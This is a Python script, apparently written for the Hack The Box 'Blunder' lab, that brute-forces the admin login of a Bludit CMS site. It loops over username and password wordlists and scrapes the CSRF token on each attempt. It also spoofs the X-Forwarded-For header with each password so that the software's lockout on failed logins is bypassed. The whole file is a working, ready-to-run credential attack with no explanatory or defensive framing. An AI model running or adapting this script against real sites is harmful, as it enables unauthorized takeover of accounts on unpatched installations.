#!/usr/bin/env python3
import re
import requests
import sys

host = 'http://blunder.htb'
login_url = host + '/admin/login'
users_file = sys.argv[1]
passws_file = sys.argv[2]


with open (users_file, "r") as rf:
    usernames = rf.read()
    usernames = usernames.strip().split("\n")

with open(passws_file, "r") as rf:
    passwords = rf.read().strip().split("\n")

for username in usernames:
    for password in passwords:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

        print('[*] Trying: {u}:{p}'.format(u = username, p = password))

        headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }

        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
    
        #print(login_result.text)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('SUCCESS: Password found!')
                print('Use {u}:{p} to login.'.format(u = username, p = password))
                print()
                break

